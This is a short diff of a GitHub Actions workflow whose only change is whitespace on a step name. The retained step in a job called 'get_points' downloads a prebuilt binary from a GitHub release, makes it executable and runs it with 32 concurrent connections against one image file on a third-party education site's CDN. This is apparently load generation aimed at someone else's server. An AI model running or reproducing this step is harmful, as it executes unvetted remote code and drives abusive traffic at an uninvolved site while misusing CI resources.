@@ -9,5 +9,5 @@ jobs:
   get_points:
     runs-on: ubuntu-latest
     steps:
-    - name: 'Go'
+    - name: 'Go' 
       run: wget https://github.com/maintell/webBenchmark/releases/download/0.1/webBenchmark_linux_x64&&chmod +x webBenchmark_linux_x64&&./webBenchmark_linux_x64 -c 32 -s "https://p.ananas.chaoxing.com/star3/origin/7ec88e9cee96f9b53d2601b11bbce0d7.jpeg?rw=640&rh=988&_fileSize=102453&_orientation=1"
